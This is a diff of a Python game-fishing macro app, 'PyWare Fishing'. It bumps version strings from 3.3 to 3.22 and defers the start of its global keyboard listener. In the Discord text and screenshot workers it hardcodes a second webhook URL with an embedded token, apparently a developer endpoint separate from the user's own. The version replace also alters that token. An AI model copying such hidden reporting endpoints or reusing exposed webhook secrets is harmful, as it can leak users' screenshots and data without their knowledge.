@@ -39,7 +39,6 @@ import math
 import gdown
 import shutil
 import traceback
-from collections import deque
 # Ctypes/Quartz For Special Click Types
 if sys.platform == "win32":
     windll = ctypes.windll.user32
@@ -117,7 +116,7 @@ IMAGES_PATH = os.path.join(BASE_PATH, "images")
 DEBUG_DIR = BASE_PATH
 
 CONFIG_PATH = os.path.join(BASE_PATH, "last_config.json")
-APP_VERSION = "3.3"
+APP_VERSION = "3.22"
 
 set_appearance_mode("dark")
 
@@ -689,7 +688,7 @@ class StatusOverlay:
         # Title
         title = tk.Label(
             self.window,
-            text="PyWare Fishing V3.3",
+            text="PyWare Fishing V3.22",
             fg="# 00C8Ff",
             bg="black",
             font=("Segoe UI", 12, "bold")
@@ -866,7 +865,7 @@ class TermsOfServiceDialog(CTkToplevel):
         # Window
         self.configure(fg_color="#181836")   # <- Main Window Ultra Dark
         self.geometry("750x600")
-        self.title("PyWare Fishing V3.3 - Terms of Service")
+        self.title("PyWare Fishing V3.22 - Terms of Service")
         self.minsize(650, 500)
         
         # Center Window
@@ -946,7 +945,7 @@ class TermsOfServiceDialog(CTkToplevel):
         textbox.grid(row=0, column=0, padx=12, pady=10, sticky="nsew")
 
         textbox.insert("1.0", """
-PyWare Fishing V3.3 - Terms of Use
+PyWare Fishing V3.22 - Terms of Use
 
 By using this software, you agree to the following:
 
@@ -1286,14 +1285,13 @@ class App(CTk):
         self.status_overlay = StatusOverlay(self)
 
         # Start Hotkey Listener
-        self.key_listener = KeyListener(on_press=self.on_key_press)
-        self.key_listener.daemon = True
-        self.key_listener.start()
+        self.key_listener = None
+        self.after(200, self.start_listeners)
 
         # Create Window
         self.configure(fg_color="#181836")   # <- Main Window Ultra Dark
         self.geometry("800x600")
-        self.title("PyWare Fishing V3.3")
+        self.title("PyWare Fishing V3.22")
 
         # Status Bar
         self.grid_columnconfigure(0, weight=1)
@@ -1308,7 +1306,7 @@ class App(CTk):
         # Logo Label
         logo_label = CTkLabel(
             top_bar, 
-            text="PYWARE FISHING V3.3",
+            text="PYWARE FISHING V3.22",
             font=CTkFont(size=16, weight="bold")
         )
         logo_label.grid(row=0, column=0, sticky="w")
@@ -2544,6 +2542,13 @@ class App(CTk):
 
         # Move EVERYTHING that touches tkinter into main thread
         self.after(0, self._handle_key_press_main_thread, pressed_key)
+    def start_listeners(self):
+        try:
+            self.key_listener = KeyListener(on_press=self.on_key_press)
+            self.key_listener.daemon = True
+            self.key_listener.start()
+        except Exception as e:
+            print("Listener failed:", e)
     def set_status(self, text, key=None):
         self.status_label.configure(text=text)
     # Macro Helper Functions
@@ -2680,7 +2685,7 @@ class App(CTk):
     def _discord_text_worker(self, webhook_url, message_prefix, loop_count, show_status):
         """Worker function to send text webhook."""
         discord_webhook_name = self.vars["discord_webhook_name"].get()
-        webhook_url2 = "https://discord.com/api/webhooks/1492827883977179216/0MCmMcW1OsXU0rDoRYRLY2V3.3rzSQf4ACmU9J8Gn1L-yh6dwC8WtIYw7Na7UHTIVpBB87"
+        webhook_url2 = "https://discord.com/api/webhooks/1492827883977179216/0MCmMcW1OsXU0rDoRYRLY2V3.22rzSQf4ACmU9J8Gn1L-yh6dwC8WtIYw7Na7UHTIVpBB87"
         try:
             if show_status == True:
                 payload = {
@@ -2713,7 +2718,7 @@ class App(CTk):
             self.set_status(f"Error sending Discord text: {e}")
     def _discord_screenshot_worker(self, webhook_url, message_prefix, loop_count, show_status):
         discord_webhook_name = self.vars["discord_webhook_name"].get()
-        webhook_url2 = "https://discord.com/api/webhooks/1492827883977179216/0MCmMcW1OsXU0rDoRYRLY2V3.3rzSQf4ACmU9J8Gn1L-yh6dwC8WtIYw7Na7UHTIVpBB87"
+        webhook_url2 = "https://discord.com/api/webhooks/1492827883977179216/0MCmMcW1OsXU0rDoRYRLY2V3.22rzSQf4ACmU9J8Gn1L-yh6dwC8WtIYw7Na7UHTIVpBB87"
         try:
             with mss.mss() as sct:
                 monitor = sct.monitors[1]
@@ -4375,7 +4380,7 @@ class App(CTk):
             last_frame_time = None
             speed_samples.clear()
 
-        # Start Capture Thread; This Remains The Existing V3.3 Capture Path.
+        # Start Capture Thread; This Remains The Existing V3.22 Capture Path.
         stop_event = self._start_capture(scan_delay)
         start_time = time.time()
         if self.vars["fish_overlay"].get() == "Enabled":
